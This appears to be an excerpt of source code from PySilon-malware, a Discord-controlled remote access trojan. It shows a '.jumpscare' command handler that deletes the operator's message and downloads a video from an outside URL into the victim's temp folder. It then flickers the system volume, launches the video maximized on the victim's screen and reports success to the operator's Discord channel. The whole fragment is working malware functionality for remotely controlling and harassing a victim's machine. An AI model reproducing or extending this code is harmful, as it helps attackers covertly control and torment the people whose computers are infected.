import win32gui
import win32con
import os
import requests
import time
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import random
import discord

# On message
elif message.content == '.jumpscare':
    await message.delete()

    # Prepare audio devices
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Set the URL of the jumpscare video
    video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"

    # Define the temporary file path
    temp_folder = os.environ['TEMP']
    temp_file = os.path.join(temp_folder, 'jumpscare.mp4')

    # Download the video if it doesn't already exist
    if not os.path.exists(temp_file):
        response = requests.get(video_url)
        with open(temp_file, 'wb') as file:
            file.write(response.content)

    # Pre-jumpscare buildup: Randomly flicker volume and screen
    await message.channel.send("`Something is coming...`")
    for _ in range(10):
        random_volume = random.uniform(0.2, 0.8)
        volume.SetMasterVolumeLevelScalar(random_volume, None)
        time.sleep(random.uniform(0.1, 0.3))
    volume.SetMasterVolumeLevelScalar(0.5, None)  # Reset volume before jumpscare

    # Execute the jumpscare
    os.startfile(temp_file)
    time.sleep(0.6)  # Allow time for the video player to open
    get_video_window = win32gui.GetForegroundWindow()
    
    # Force fullscreen
    win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)

    # Wait for the video to finish (adjust this duration based on video length)
    video_duration = 5  # Adjust to match the video length in seconds
    time.sleep(video_duration)

    # Exit fullscreen
    win32gui.ShowWindow(get_video_window, win32con.SW_RESTORE)

    # Post-jumpscare success message
    embed = discord.Embed(
        title="🟢 Success",
        description="```Jumpscare has been triggered.```",
        colour=discord.Colour.green()
    )
    embed.set_author(
        name="PySilon-malware",
        icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
    )
    await message.channel.send(embed=embed)
